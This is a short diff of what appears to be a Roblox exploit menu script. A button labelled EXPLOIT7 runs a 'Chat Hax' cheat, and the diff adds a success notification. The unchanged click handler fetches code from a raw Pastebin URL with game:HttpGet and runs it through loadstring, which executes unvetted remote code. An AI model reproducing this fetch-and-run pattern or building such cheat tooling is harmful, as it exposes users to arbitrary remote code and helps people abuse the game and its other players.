@@ -258,7 +258,8 @@ EXPLOIT7.TextSize = 14.000
 EXPLOIT7.TextWrapped = true
 EXPLOIT7.MouseButton1Down:connect(function()
 loadstring(game:HttpGet("https://pastebin.com/raw/Jxnmt3aM"))()
-Title = "Script:";
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = "Script:";
 	Text = "Successfully Executed Chat Hax!";
 	Icon = "rbxthumb://type=Asset&id=9408318893&w=150&h=150"})
 Duration = 16;
